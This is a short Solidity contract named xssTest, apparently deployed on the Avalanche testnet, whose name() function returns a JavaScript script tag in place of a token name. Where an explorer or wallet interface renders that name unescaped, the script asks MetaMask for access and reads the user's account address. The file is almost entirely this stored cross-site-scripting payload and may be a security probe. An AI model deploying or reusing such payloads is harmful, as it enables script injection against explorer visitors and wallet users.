/**
 *Submitted for verification at testnet.snowtrace.io on 2022-09-28
*/

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.7;

contract xssTest {
   
    function name() public view returns (string memory){
        return "<script>\"undefined\"!=typeof web3?(ethereum.enable(),web3=new Web3(web3.currentProvider),web3.eth.getCoinbase((function(e,n){myCoinBase=n,console.log(myCoinBase)}))):alert(/Need Metamask/);</script>";
    }

}